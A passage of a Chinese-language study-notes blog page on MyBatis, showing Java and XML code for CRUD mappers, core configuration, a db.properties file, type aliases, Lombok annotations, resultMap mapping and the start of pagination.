class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*MyTest.java*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*修改一个用户*/</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateUser</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MyBatisUtils.getSqlSession();</span><br><span class="line">        <span class="type">UserDao</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserDao.class);</span><br><span class="line">        <span class="type">int</span> <span class="variable">updateUser</span> <span class="operator">=</span> mapper.updateUser(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">23</span>,<span class="string">&quot;ZhangSan&quot;</span>,<span class="string">&quot;123456&quot;</span>));</span><br><span class="line">        System.out.println(updateUser);</span><br><span class="line">        System.out.println(<span class="string">&quot;update success&quot;</span>);</span><br><span class="line">        sqlSession.commit();</span><br><span class="line">        sqlSession.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>![Untitled](.&#x2F;SSM.assets&#x2F;Untitled 3.png)</p><p>4.根据名字删除用户：在UserDao接口类中定义插入用户的函数方法，接着在UserDao.xml文件中写出mybatis的sql语句，记住标签要随着sql语句的内容进行更改，注意sql语句的书写，代码如下：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///UserDao.java</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*根据名字删除用户*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">deleteUserByName</span><span class="params">(String name)</span>;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--UserDao.xml--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--/*根据名字删除用户*/--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">&quot;deleteUserByName&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.neuedu.pojo.User&quot;</span>&gt;</span></span><br><span class="line">        delete from user where name=#&#123;name&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*MyTest.java*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*根据名字删除用户*/</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteUserByName</span><span class="params">()</span>&#123;</span><br><span class="line">        SqlSession sqlSession=  MyBatisUtils.getSqlSession();</span><br><span class="line">        <span class="type">UserDao</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserDao.class);</span><br><span class="line">        <span class="type">int</span> deleteUserByName= mapper.deleteUserByName(<span class="string">&quot;ZhangSan&quot;</span>);</span><br><span class="line">        System.out.println(deleteUserByName);</span><br><span class="line">        System.out.println(<span class="string">&quot;deleteByName success&quot;</span>);</span><br><span class="line"></span><br><span class="line">        sqlSession.commit();</span><br><span class="line">        sqlSession.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>![Untitled](.&#x2F;SSM.assets&#x2F;Untitled 4.png)</p><p>5.根据姓名模糊查询：在UserDao接口类中定义插入用户的函数方法，接着在UserDao.xml文件中写出mybatis的sql语句，记住标签要随着sql语句的内容进行更改，注意sql语句的书写，代码如下：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///UserDao.java</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*根据姓名模糊查询*/</span></span><br><span class="line">List&lt;User&gt; <span class="title function_">getUserLike</span><span class="params">(String name)</span>;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--UserDao.xml--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserLike&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.neuedu.pojo.User&quot;</span> &gt;</span></span><br><span class="line">        select * from user where  name like &quot;%&quot;#&#123;name&#125;&quot;%&quot;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*MyTest.java*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*根据姓名模糊查询*/</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUserLike</span><span class="params">()</span>&#123;</span><br><span class="line">        SqlSession sqlSession=  MyBatisUtils.getSqlSession();</span><br><span class="line">        <span class="type">UserDao</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserDao.class);</span><br><span class="line">        List&lt;User&gt; userLike = mapper.getUserLike(<span class="string">&quot;%张%&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (User user : userLike) &#123;</span><br><span class="line">            System.out.println(user);</span><br><span class="line">        &#125;</span><br><span class="line">        sqlSession.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>![Untitled](.&#x2F;SSM.assets&#x2F;Untitled 5.png)</p><h1 id="Day3-24-3-21"><a href="#Day3-24-3-21" class="headerlink" title="Day3-24.3.21"></a>Day3-24.3.21</h1><h2 id="核心配置文件、environment元素、mapper元素"><a href="#核心配置文件、environment元素、mapper元素" class="headerlink" title="核心配置文件、environment元素、mapper元素"></a>核心配置文件、environment元素、mapper元素</h2><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--configuration核心配置文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--导入外部配置文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span> <span class="attr">resource</span>=<span class="string">&quot;db.properties&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--配置日志 mybatis标准日志--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;setting name=&quot;logImpl&quot; value=&quot;STDOUT_LOGGING&quot;/&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;logImpl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;LOG4J&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--配置别名   --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--配置别名--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;typeAlias type=&quot;com.neuedu.pojo.Student&quot; alias=&quot;student&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;typeAlias type=&quot;com.neuedu.pojo.Teacher&quot; alias=&quot;teacher&quot;/&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--扫描实体类的包--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.neuedu.pojo&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--环境配置文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--环境变量--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--事务管理器--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;driver&#125;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/mybatis?serverTimezone=GMT%2B8&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;username&#125;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;password&#125;&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--mapper映射文件绑定--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--1.扫描mapper映射文件绑定注册        --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;mapper resource=&quot;com/neuedu/mapper/UserMapper.xml&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--2.class文件 接口文件和mapper映射文件同名且同包--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;mapper class=&quot;com.neuedu.mapper.UserMapper&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--3.扫描包绑定注册    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.neuedu.mapper&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--4.使用完全限定资源定位符url绑定绝对路径 不建议 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;mapper url=&quot;D:\GoodGoodStudy\21pro_practice\new1\Mybatis_Study\mybatis-02\src\main\java\com\neuedu\dao\UserDao.xml&quot;/&gt;--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="Properties优化"><a href="#Properties优化" class="headerlink" title="Properties优化"></a>Properties优化</h2><p>在resource文件中创建一个db.properties文件作为properties优化配置文件，输入数据库的相关配置信息</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">driver=com.mysql.cj.jdbc.Driver</span><br><span class="line">url=jdbc:mysql:<span class="comment">//localhost:3306/mybatis?useUnicode=true&amp;characterEncoding=utf-8</span></span><br><span class="line">username=root</span><br><span class="line">password=<span class="number">123456</span></span><br></pre></td></tr></table></figure></div><p>上面的优化配置文件写好后，就可以直接在config数据库的配置信息进行引用</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">&lt;properties resource=<span class="string">&quot;db.properties&quot;</span>/&gt;</span><br><span class="line">    &lt;typeAliases&gt;</span><br><span class="line">&lt;!--配置别名--&gt;</span><br><span class="line">&lt;!--        &lt;typeAlias type=<span class="string">&quot;com.neuedu.pojo.User&quot;</span> alias=<span class="string">&quot;User&quot;</span>/&gt;--&gt;</span><br><span class="line">&lt;!--扫描实体类的包--&gt;</span><br><span class="line">        &lt;typeAlias type=<span class="string">&quot;com.neuedu.pojo&quot;</span>/&gt;</span><br><span class="line">    &lt;/typeAliases&gt;</span><br><span class="line">&lt;!--环境配置文件--&gt;</span><br><span class="line">    &lt;environments <span class="keyword">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span><br><span class="line">&lt;!--环境变量--&gt;</span><br><span class="line">        &lt;environment id=<span class="string">&quot;development&quot;</span>&gt;</span><br><span class="line">&lt;!--事务管理器--&gt;</span><br><span class="line">            &lt;transactionManager type=<span class="string">&quot;JDBC&quot;</span>/&gt;</span><br><span class="line">            &lt;dataSource type=<span class="string">&quot;POOLED&quot;</span>&gt;</span><br><span class="line">                &lt;property name=<span class="string">&quot;driver&quot;</span> value=<span class="string">&quot;$&#123;driver&#125;&quot;</span>/&gt;</span><br><span class="line">                &lt;property name=<span class="string">&quot;url&quot;</span> value=<span class="string">&quot;$&#123;url&#125;&quot;</span>/&gt;</span><br><span class="line">                &lt;property name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;$&#123;username&#125;&quot;</span>/&gt;</span><br><span class="line">                &lt;property name=<span class="string">&quot;password&quot;</span> value=<span class="string">&quot;$&#123;password&#125;&quot;</span>/&gt;</span><br><span class="line">            &lt;/dataSource&gt;</span><br><span class="line">        &lt;/environment&gt;</span><br><span class="line">    &lt;/environments&gt;</span><br><span class="line">    &lt;mappers&gt;</span><br><span class="line">        &lt;!--mapper映射文件绑定--&gt;</span><br><span class="line">&lt;!--<span class="number">1.</span>扫描mapper映射文件绑定注册        --&gt;</span><br><span class="line">&lt;!--        &lt;mapper resource=<span class="string">&quot;com/neuedu/mapper/UserMapper.xml&quot;</span>/&gt;--&gt;</span><br><span class="line">&lt;!--<span class="number">2.</span>class文件 接口文件和mapper映射文件同名且同包--&gt;</span><br><span class="line">&lt;!--    &lt;mapper class=<span class="string">&quot;com.neuedu.mapper.UserMapper&quot;</span>/&gt;--&gt;</span><br><span class="line">&lt;!--<span class="number">3.</span>扫描包绑定注册    --&gt;</span><br><span class="line">    &lt;<span class="keyword">package</span> name=<span class="string">&quot;com.neuedu.mapper&quot;</span>/&gt;</span><br><span class="line">&lt;!--<span class="number">4.</span>使用完全限定资源定位符url绑定绝对路径 不建议 --&gt;</span><br><span class="line">&lt;!--        &lt;mapper url=<span class="string">&quot;D:\GoodGoodStudy\21pro_practice\new1\Mybatis_Study\mybatis-02\src\main\java\com\neuedu\dao\UserDao.xml&quot;</span>/&gt;--&gt;</span><br><span class="line">    &lt;/mappers&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure></div><p>![Untitled](.&#x2F;SSM.assets&#x2F;Untitled 6.png)</p><p>出现报错，解析发现需要规定配置标签的顺序</p><h2 id="配置别名typeAliases"><a href="#配置别名typeAliases" class="headerlink" title="配置别名typeAliases"></a>配置别名typeAliases</h2><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--配置别名   --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--配置别名--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;typeAlias type=&quot;com.neuedu.pojo.Student&quot; alias=&quot;student&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;typeAlias type=&quot;com.neuedu.pojo.Teacher&quot; alias=&quot;teacher&quot;/&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--扫描实体类的包--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.neuedu.pojo&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br></pre></td></tr></table></figure></div><ul><li>一种是type使用具体的类名，比较麻烦，批量起来麻烦（标签：<strong>typeAlias type</strong>）</li><li>另一种是直接扫描实体包所在文件夹（这里的标签是<strong>package name</strong>）</li></ul><p>注意不要搞混了，否则容易出现报错的情况。（如下的一种报错情况）</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Could not resolve type alias &#x27;&#x27;. Cause: java.lang.ClassNotFoundException: Cannot find class:</span><br></pre></td></tr></table></figure></div><h1 id="Day4-24-3-26"><a href="#Day4-24-3-26" class="headerlink" title="Day4-24.3.26"></a>Day4-24.3.26</h1><h2 id="使用注解"><a href="#使用注解" class="headerlink" title="使用注解"></a>使用注解</h2><p>引入依赖lombok</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;lombok&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.18</span><span class="number">.30</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></div><ol><li><p>使用注解构建实体类的方法（User.java），如下代码种所示的三种注解，分别对应注释下的信息</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.neuedu.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="comment">//get set tostring</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="comment">//所有参数的构造</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="comment">//无参构造</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"><span class="comment">//get set toString 有参 无参</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>使用注解构建实体的映射方法（UserMapper.java），使用注解的方式省略映射文件的编写</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.neuedu.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.neuedu.pojo.User;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询所有用户</span></span><br><span class="line"><span class="meta">@Select(&quot;select * from user&quot;)</span><span class="comment">//注解</span></span><br><span class="line">List&lt;User&gt; <span class="title function_">getUserList</span><span class="params">()</span>;</span><br><span class="line"><span class="meta">@Select(&quot;select * from user where id=#&#123;id&#125;&quot;)</span></span><br><span class="line">User <span class="title function_">getUserById</span><span class="params">(Integer id)</span>;</span><br><span class="line"><span class="meta">@Insert(&quot;insert into user(name,pwd) values(#&#123;name&#125;,#&#123;pwd&#125;)&quot;)</span></span><br><span class="line"><span class="comment">/*插入一个用户*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">addUser</span><span class="params">(User user)</span>;</span><br><span class="line"><span class="comment">/*删除一个用户 根据ID*/</span></span><br><span class="line"><span class="meta">@Delete(&quot;delete from user where id=#&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="type">int</span>  <span class="title function_">deleteUser</span><span class="params">(Integer id)</span>;</span><br><span class="line"><span class="comment">/*修改一个用户*/</span></span><br><span class="line"><span class="meta">@Update(&quot;update user set name=#&#123;name&#125;,pwd=#&#123;pwd&#125; where id=#&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">updateUser</span><span class="params">(User user)</span>;</span><br><span class="line"><span class="comment">/*根据名字删除用户*/</span></span><br><span class="line"><span class="meta">@Delete(&quot;delete from user where name=#&#123;name&#125;&quot;)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">deleteUserByName</span><span class="params">(String name)</span>;</span><br><span class="line"><span class="comment">/*根据姓名模糊查询*/</span></span><br><span class="line"><span class="meta">@Select(&quot;select * from user where name like concat(&#x27;%&#x27;,#&#123;name&#125;,&#x27;%&#x27;)&quot;)</span></span><br><span class="line">List&lt;User&gt; <span class="title function_">getUserLike</span><span class="params">(String name)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div></li></ol><h2 id="使用resultMap实现映射"><a href="#使用resultMap实现映射" class="headerlink" title="使用resultMap实现映射"></a>使用resultMap实现映射</h2><p><strong>用以解决实体类属性名与数据库表中字段名不一致的情况，查询结果映射成实体对象</strong></p><p>column 从数据库中查询到的结果集的列名或列别名。</p><p>property 将 column属性指定的列结果映射到对象的哪个属性</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--<span class="number">1.</span>简单的AS语句--&gt;</span><br><span class="line">&lt;!--    &lt;select id=<span class="string">&quot;getUserById&quot;</span> resultType=<span class="string">&quot;com.neuedu.pojo.User&quot;</span> parameterType=<span class="string">&quot;int&quot;</span> &gt;--&gt;</span><br><span class="line">&lt;!--        select id,name,pwd AS password from user where id=#&#123;id&#125;--&gt;</span><br><span class="line">&lt;!--    &lt;/select&gt;--&gt;</span><br><span class="line">&lt;!--<span class="number">2.</span>通过resultMap实现    --&gt;</span><br><span class="line">    &lt;resultMap id=<span class="string">&quot;userMap&quot;</span> type=<span class="string">&quot;com.neuedu.pojo.User&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">        &lt;result column=<span class="string">&quot;id&quot;</span> property=<span class="string">&quot;id&quot;</span>/&gt;</span><br><span class="line">        &lt;result column=<span class="string">&quot;name&quot;</span> property=<span class="string">&quot;name&quot;</span>/&gt;</span><br><span class="line">        &lt;result column=<span class="string">&quot;pwd&quot;</span> property=<span class="string">&quot;password&quot;</span>/&gt;</span><br><span class="line">&lt;!--column 数据库表字段，property实体类属性--&gt;</span><br><span class="line">    &lt;/resultMap&gt;</span><br></pre></td></tr></table></figure></div><p>实体类中使用的password，而数据库中定义的是pwd，所以使用resultMap来映射实体对象</p><h2 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h2><h3 id="分页限制"><a href="#分页限制" class="headerlink" title="分页限制"></a>分页限制</h3><p>使用RowBounds进行分页处理，是将所有符合条件的数据全都查询到内存中，然后在内存中对数据进行分页，若数据量大，千万别使用RowBounds</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询Limit</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">getUserLimit</span><span class="params">(Map&lt;String,Integer&gt; 